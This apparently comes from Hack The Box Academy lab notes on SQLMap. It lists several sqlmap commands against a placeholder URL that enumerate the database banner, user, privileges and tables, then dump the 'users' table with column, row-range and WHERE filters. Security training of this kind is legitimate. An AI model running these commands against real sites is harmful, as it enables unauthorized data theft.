...
```shell-session
xF1NN@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
...
```shell-session
xF1NN@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
...
```shell-session
xF1NN@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
...
```shell-session
xF1NN@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
...
```shell-session
xF1NN@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
...
```shell-session
xF1NN@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
...
![SQLMap_Essentials_image_11.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_11.png)
